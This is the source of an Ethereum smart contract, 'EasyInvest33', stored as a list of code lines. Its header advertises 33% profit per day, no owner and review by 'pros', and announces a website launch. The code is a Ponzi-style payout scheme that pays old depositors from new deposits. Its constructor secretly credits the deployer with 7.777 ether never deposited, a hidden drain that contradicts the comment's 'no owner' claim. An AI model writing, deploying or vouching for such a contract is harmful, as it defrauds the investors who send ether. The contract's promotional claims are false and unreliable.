['pragma solidity ^0.4.24;\n', '/**\n', ' *                                               __   \n', '..-&#39;&#39;&#39;-.   ..-&#39;&#39;&#39;-.                .-..-.     / /   \n', '\\.-&#39;&#39;&#39;\\ \\  \\.-&#39;&#39;&#39;\\ \\              / .&#39;&#39;. \\   / /    \n', '       | |        | |            |  |  |  | / /     \n', '    __/ /      __/ /             |  |  |  |/ /      \n', '   |_  &#39;.     |_  &#39;.              \\ &#39;..&#39; // /       \n', '      `.  \\      `.  \\             `-&#39;&#39;-&#39;/ /        \n', '        \\ &#39;.       \\ &#39;.                 / /.-..-.   \n', '         , |        , |                / // .&#39;&#39;. \\  \n', '         | |        | |               / /|  |  |  | \n', '        / ,&#39;       / ,&#39;              / / |  |  |  | \n', '-....--&#39;  /-....--&#39;  /              / /   \\ &#39;..&#39; /  \n', '`.. __..-&#39; `.. __..-&#39;              /_/     `-&#39;&#39;-&#39;   \n', ' * \n', ' * Easy Investment 33% Contract\n', ' *  - GAIN 33% PER 24 HOURS (every 5900 blocks)\n', ' *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)\n', ' *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\n', ' *\n', ' * How to use:\n', ' *  1. Send any amount of ether to make an investment\n', ' *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)\n', ' *  OR\n', ' *  2b. Send more ether to reinvest AND get your profit at the same time\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 70000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' *\n', ' * Contract reviewed and approved by pros!\n', ' *\n', ' * IMPORTANT / ВАЖНО !!!\n', ' * Website launch 4 October 2018 12:00 PM\n', ' * Cайт откроется 4 Октября 2018 12:00 PM\n', ' * \n', ' * All news in comments!\n', ' * Все новости в комментах!\n', ' */\n', ' \n', 'contract EasyInvest33 {\n', '     // records amounts invested\n', '    mapping (address => uint256) public invested;\n', '    // records blocks at which investments were made\n', '    mapping (address => uint256) public atBlock;\n', '    constructor() public {\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += 7.777 ether;  \n', '    }\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function () external payable {\n', '        // if sender (aka YOU) is invested more than 0 ether\n', '        if (invested[msg.sender] != 0) {\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * 33% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 amount = invested[msg.sender] * 33 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '\n', '            // send calculated amount of ether directly to sender (aka YOU)\n', '            msg.sender.transfer(amount);\n', '        }\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '    }\n', '}']